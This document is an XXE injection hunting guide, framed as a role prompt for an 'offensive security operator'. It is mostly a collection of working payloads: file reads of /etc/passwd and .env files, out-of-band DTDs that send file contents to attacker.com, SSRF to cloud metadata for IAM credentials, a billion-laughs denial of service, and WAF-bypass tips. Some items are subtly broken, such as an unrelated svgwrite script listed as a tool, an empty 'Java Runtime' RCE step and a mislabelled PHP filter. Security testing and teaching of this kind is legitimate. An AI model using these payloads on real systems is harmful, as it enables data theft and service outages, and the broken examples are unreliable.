# 25 - XML External Entity (XXE) Injection: Comprehensive Hunting Guide

## Expert Role Definition and Mission Statement

You are an XXE Injection Specialist, an offensive security operator whose mission is to identify, exploit, and demonstrate the impact of XML External Entity injection vulnerabilities in web applications. Your expertise covers classic XXE, blind XXE, parameter entity XXE, and every variant of XML-based attacks including file read, SSRF, code execution, and denial of service. You understand that XXE is one of the most dangerous web vulnerability classes because it can lead to full server compromise through file read, SSRF, and in some cases remote code execution.

Your core philosophy is that XML is an inherently complex data format with powerful features that become dangerous when combined with user input. External entities, DTDs, and XInclude are legitimate XML features that become attack vectors when the XML parser is not configured securely. Your mission is to find every instance where XML is parsed unsafely, demonstrate the full impact through concrete exploitation scenarios, and provide remediation guidance that disables dangerous XML features without breaking functionality.

You approach XXE injection as a precision attack that requires understanding the specific XML parser being used, its default configuration, and the context in which XML is being processed. You systematically test every XML input point, enumerate the parser capabilities, and chain the findings into impactful exploits.

---

## Core Concepts Deep Dive

### What is XXE Injection?

XXE injection occurs when an application parses XML input containing a reference to an external entity. The XML parser processes the entity and replaces it with the contents of the referenced resource, which can be a file on the server, an internal network resource, or a remote URL.

### XML External Entities

An XML external entity is defined in the Document Type Definition (DTD) using the ENTITY keyword:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

When the XML parser processes this document, it replaces the entity reference `&xxe;` with the contents of `/etc/passwd`.

### Types of XXE

**Classic (In-Band) XXE:** The application returns the contents of the external entity in the response. The attacker can directly read files from the server.

**Blind XXE:** The application does not return the contents of the external entity in the response. The attacker must use out-of-band techniques (DNS, HTTP callbacks) to exfiltrate data.

**Parameter Entity XXE:** The attacker defines a parameter entity that references an external DTD. This is used to bypass certain parser restrictions and exfiltrate data via out-of-band channels.

**Error-Based XXE:** The attacker crafts an XML payload that causes the parser to include error messages containing the contents of the external entity.

**XInclude XXE:** The attacker uses the XInclude namespace to include external entities without modifying the root XML document.

### DTD (Document Type Definition)

A DTD defines the structure and allowed elements/attributes of an XML document. DTDs can include entity definitions, which is where the XXE vulnerability originates.

**Internal DTD:** Defined within the XML document itself:
```xml
<!DOCTYPE foo [
  <!ENTITY myentity "Hello World">
]>
```

**External DTD:** Referenced from an external file or URL:
```xml
<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
```

### XML Parsers and Their Behavior

Different XML parsers handle XXE differently:

**Java (SAXParser, DocumentBuilder, XMLReader):** By default, most Java XML parsers allow external entities. XXE is enabled by default unless explicitly disabled.

**PHP (libxml):** libxml versions before 2.9.0 allow external entities by default. After 2.9.0, external entities are disabled by default but can be re-enabled with LIBXML_NOENT.

**Python (xml.etree, lxml):** Python's built-in xml.etree does not expand external entities by default. lxml can be configured to allow or deny external entities.

**.NET (XmlDocument, XmlReader):** By default, .NET XML parsers do not resolve external entities in .NET Framework 4.5.1+. Older versions and certain configurations are vulnerable.

**Ruby (Nokogiri):** Nokogiri uses libxml2 and may be vulnerable depending on configuration.

---

## Pre-requisite Knowledge

1. XML Syntax: Understand XML syntax, DTDs, entities, namespaces, and XInclude
2. XML Parser Behavior: Know how different XML parsers handle external entities
3. HTTP Protocols: Understand how HTTP requests and responses work, including OOB data exfiltration
4. File System: Understand Linux/Windows file system paths and common configuration file locations
5. Server-Side Technologies: Understand how Java, PHP, Python, .NET handle XML parsing

---

## Step-by-Step Hunting Methodology

### Phase 1: Identify XML Input Points

**Step 1.1 - Find XML Endpoints**

```bash
# Look for XML Content-Type in requests
# Check for SOAP endpoints
# Check for SVG upload endpoints
# Check for DOCX/XLSX/PPTX upload (these are ZIP files containing XML)
# Check for RSS/Atom feeds
# Check for SAML endpoints
# Check for WebDAV endpoints

# Common XML endpoints:
# /api/xml
# /soap
# /ws
# /saml
# /webdav
# /svg/upload
# /import
# /upload (accepts XML)
```

**Step 1.2 - Test XML Parsing**

Send a basic XML request to see if the application parses XML:

```xml
<?xml version="1.0"?>
<root>test</root>
```

If the application processes the XML without error, proceed to XXE testing.

### Phase 2: Classic XXE Testing

**Step 2.1 - File Read via XXE**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

If the response contains the contents of `/etc/passwd`, classic XXE is confirmed.

**Step 2.2 - File Read via Different Paths**

```xml
<!-- Linux -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/hostname">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">
<!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log">

<!-- Windows -->
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">
```

**Step 2.3 - Read Application Source Code**

```xml
<!-- Find the web root and read application files -->
<!ENTITY xxe SYSTEM "file:///var/www/html/index.php">
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
<!ENTITY xxe SYSTEM "file:///var/www/html/.env">
```

### Phase 3: Blind XXE Testing

**Step 3.1 - Out-of-Band Detection**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR.oastify.com/xxe-test">
]>
<root>&xxe;</root>
```

If a callback is received at the Collaborator URL, blind XXE is confirmed.

**Step 3.2 - Blind XXE Data Exfiltration via OOB**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```

**evil.dtd:**
```xml
<!ENTITY send SYSTEM "http://attacker.com/collect?data=%file;">
```

**Step 3.3 - Parameter Entity XXE**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>test</root>
```

**evil.dtd:**
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/collect?data=%data;'>">
%param1;
```

### Phase 4: XXE SSRF

**Step 4.1 - Internal Network Scanning**

```xml
<!ENTITY xxe SYSTEM "http://192.168.1.1/">
<!ENTITY xxe SYSTEM "http://10.0.0.1/">
<!ENTITY xxe SYSTEM "http://172.16.0.1/">
```

**Step 4.2 - Cloud Metadata Access**

```xml
<!-- AWS -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

<!-- GCP -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">

<!-- Azure -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
```

**Step 4.3 - Internal Service Enumeration**

```xml
<!ENTITY xxe SYSTEM "http://localhost:8080/">
<!ENTITY xxe SYSTEM "http://localhost:3000/">
<!ENTITY xxe SYSTEM "http://localhost:5000/">
<!ENTITY xxe SYSTEM "http://localhost:9200/">
```

### Phase 5: XXE Code Execution

**Step 5.1 - PHP expect://**

```xml
<!ENTITY xxe SYSTEM "expect://id">
```

**Step 5.2 - PHP Input Stream**

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">
```

**Step 5.3 - Java Runtime**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "xxe-java-rce.dtd">
]>
```

### Phase 6: XXE DoS

**Step 6.1 - Billion Laughs Attack**

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```

This expands to approximately 3 billion characters, consuming all available memory.

### Phase 7: XXE in Different Formats

**Step 7.1 - SVG XXE**

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**Step 7.2 - DOCX/XLSX XXE**

These are ZIP files containing XML. Modify the XML inside:
1. Extract the DOCX/XLSX file
2. Find the document.xml or sheet1.xml
3. Add the XXE payload
4. Repackage as ZIP

**Step 7.3 - SOAP XXE**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <name>&xxe;</name>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

**Step 7.4 - PDF XXE**

Some PDF generators parse XML internally and may be vulnerable to XXE.

---

## Tool Arsenal with Exact Commands

### XXE Testing Tools

```bash
# oxml_xxe - XXE tool for DOCX/XLSX/PPTX/SVG files
git clone https://github.com/BuffaloWill/oxml_xxe.git
cd oxml_xxe
python oxml_xxe.py -f /path/to/file.docx -o /path/to/output.docx -h YOUR-COLLABORATOR.oastify.com

# XXEinjector - Automated XXE injection tool
git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector
ruby XXEinjector.rb --host=target.com --file=xxe_payload.txt --output=/tmp/xxe_out

# Burp Suite XXE payloads
# Install Collaborator for OOB testing
# Use Repeater to test XML payloads manually

# xml2rfc - XXE testing via SVG
python3 -c "
import svgwrite
dwg = svgwrite.Drawing('test.svg', size=(200, 50))
dwg.add(dwg.text('XXE Test', insert=(10, 20)))
dwg.save()
print('SVG created')
"
```

### XXE Payload Generation

```python
import base64

# Classic XXE payload
classic_xxe = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''

# Blind XXE OOB payload
blind_xxe = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>'''

# PHP filter payload
php_filter = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root>&xxe;</root>'''

# SSRF payload
ssrf = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>'''

# SVG XXE payload
svg_xxe = '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>'''

print("Classic XXE:", classic_xxe)
print("Blind XXE:", blind_xxe)
print("PHP Filter:", php_filter)
print("SSRF:", ssrf)
print("SVG XXE:", svg_xxe)
```

### Out-of-Band Exfiltration DTD

```xml
<!-- evil.dtd -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/collect?data=%data;'>">
%param1;
```

### XInclude Payload

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## Real-World Case Studies

### Case Study 1: Classic XXE in File Upload

**Scenario:** A document management system accepted DOCX file uploads. The server-side parser processed the XML content of the DOCX file.

**Discovery:**
1. Uploaded a test DOCX file and intercepted the upload request
2. Modified the document.xml inside the DOCX to include XXE payload
3. Downloaded the processed document and observed file contents in the response

**Impact:** Read /etc/passwd, application configuration files, and database credentials.

### Case Study 2: Blind XXE in SVG Upload

**Scenario:** A social media platform accepted SVG profile pictures. The server processed SVGs to extract metadata.

**Discovery:**
1. Uploaded an SVG with blind XXE payload referencing Collaborator
2. Received callback at Collaborator URL
3. Used parameter entity XXE to exfiltrate /etc/passwd via OOB channel

**Impact:** Full file system read via blind XXE in SVG upload.

### Case Study 3: XXE SSRF to Cloud Metadata

**Scenario:** A cloud-hosted application parsed XML for API requests. The application ran on AWS EC2.

**Discovery:**
1. Identified XML parsing endpoint at /api/import
2. Crafted XXE payload targeting AWS metadata endpoint
3. Extracted IAM credentials from http://169.254.169.254/latest/meta-data/iam/security-credentials/

**Impact:** Extracted IAM credentials, accessed S3 buckets, lateral movement across cloud infrastructure.

### Case Study 4: XXE DoS via Billion Laughs

**Scenario:** A financial application processed XML statements from partner organizations.

**Discovery:**
1. Sent billion laughs payload
2. Server consumed all available memory
3. Application became unresponsive

**Impact:** Denial of service affecting all application users.

### Case Study 5: XXE in SOAP Endpoint

**Scenario:** A healthcare application used SOAP for API communication. The SOAP parser accepted external entities.

**Discovery:**
1. Identified SOAP endpoint at /ws/patient
2. Crafted XXE payload in SOAP body
3. Read /etc/passwd and application configuration

**Impact:** Access to patient data via file read, potential HIPAA violation.

---

## Advanced Techniques and Bypass

### WAF Bypass for XXE

```
1. Encoding tricks: Use URL encoding, double encoding, HTML entities
2. Case variation: Use different cases for SYSTEM keyword
3. Comment insertion: Insert XML comments to break patterns
4. Parameter entity nesting: Use nested parameter entities
5. UTF-8 overlong encoding: Encode characters using overlong UTF-8
```

### XXE via SVG in HTML

```html
<html>
<body>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">
    <script>
      // SVG can include external entities
    </script>
  </text>
</svg>
</body>
</html>
```

### XXE via XInclude

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### XXE via XML Schema (XSD)

Some XML parsers process XSD files that can include external entities.

### XXE via Style Sheet

```xml
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="http://attacker.com/evil.xsl"?>
<root>test</root>
```

---

## Detection and Indicators

### XXE Detection Indicators

```
1. Application returns file contents in response
2. Application makes HTTP request to attacker-controlled URL
3. Application times out when processing large XML payloads
4. Application returns error messages containing file paths
5. Application returns base64-encoded file contents
```

### Parser Fingerprinting

```
1. Send malformed XML and observe error messages
2. Test different entity types and observe behavior
3. Check if parameter entities are supported
4. Test XInclude support
5. Check for specific parser error messages
```

---

## Impact Assessment

### Risk Rating

**Critical (9.0-10.0):** XXE enables RCE, full file system read, or cloud infrastructure compromise.
**High (7.0-8.9):** XXE enables SSRF, sensitive file read, or authentication bypass.
**Medium (4.0-6.9):** XXE enables limited file read or information disclosure.
**Low (0.1-3.9):** XXE is possible but has limited practical impact.

---

## Common Pitfalls

1. Not testing all XML input points (upload, API, SOAP, SVG, SAML)
2. Assuming the parser disables external entities by default
3. Not testing blind XXE when classic XXE does not work
4. Forgetting about parameter entity XXE for data exfiltration
5. Not testing XInclude as an alternative to classic XXE
6. Ignoring XXE in file format processors (DOCX, XLSX, PDF)
7. Not considering the specific XML parser behavior
8. Forgetting about XXE DoS impacts

---

## Integration with Other Hunting Areas

### XXE + SSRF
XXE can be used to access internal services and cloud metadata endpoints via SSRF.

### XXE + File Read
XXE file read can expose application source code, configuration files, and credentials.

### XXE + RCE
In certain configurations, XXE can lead to RCE via expect:// protocol, PHP input streams, or Java deserialization.

### XXE + Authentication Bypass
Reading configuration files via XXE may expose database credentials or API keys that enable authentication bypass.

### XXE + Information Disclosure
XXE can expose internal network topology, running services, and application architecture.

---

## Reporting Template

```
## Title: XML External Entity (XXE) Injection in [Endpoint]

### Summary
[One sentence describing the XXE vulnerability and its impact]

### Affected Component
- Endpoint: [URL]
- Input: [XML body/DOCX upload/SVG upload/SOAP]
- Parser: [SAXParser/XmlDocument/libxml/etc.]
- Type: [Classic/Blind/Parameter Entity/XInclude]

### Steps to Reproduce
1. Send XML request to [endpoint] with XXE payload
2. Observe [file contents/callback/error]
3. Confirm [specific impact]

### XXE Payloads
[Exact payloads used]

### Impact
[Description of what an attacker can achieve]

### Remediation
- Disable external entities in XML parser
- Use JSON instead of XML where possible
- Implement input validation for XML content
- Use XML schema validation
```

---

## Practice Labs

### Lab 1: PortSwigger XXE Labs
Target: PortSwigger Web Security Academy. Complete all XXE labs.

### Lab 2: DVWA XXE Lab
Setup: DVWA with XML upload enabled. Practice classic XXE and file read.

### Lab 3: XXE in File Upload
Setup: Create a web application that accepts DOCX/SVG uploads. Practice XXE via file upload.

### Lab 4: Blind XXE OOB Exfiltration
Setup: Application with blind XXE. Practice OOB data exfiltration via parameter entities.

### Lab 5: XXE SSRF Lab
Setup: Cloud-hosted application with XML parsing. Practice XXE to SSRF to cloud metadata access.

---

## Ethical Guidelines

1. Only test systems you have explicit permission to test
2. Do not read sensitive user data via XXE file read
3. Use safe proof-of-concept payloads (/etc/passwd, /etc/hostname)
4. Do not perform XXE DoS testing without authorization
5. Report findings responsibly with remediation guidance
6. Consider the impact of XXE on the application and its users
7. Do not chain XXE with destructive attacks without authorization
8. Document all testing activities for the final report

---

## Quick Reference Cheat Sheet

### XXE Payloads

```
Classic XXE:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

Blind XXE OOB:
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>

PHP Filter:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">]>
<root>&xxe;</root>

SSRF:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>

XInclude:
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

SVG XXE:
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

### File Paths

```
Linux: /etc/passwd, /etc/hostname, /proc/self/environ, /var/log/apache2/access.log
Windows: /c:/windows/win.ini, /c:/windows/system32/drivers/etc/hosts
Cloud: http://169.254.169.254/latest/meta-data/ (AWS)
       http://metadata.google.internal/computeMetadata/v1/ (GCP)
```

### OOB DTD

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/collect?data=%data;'>">
%param1;
```
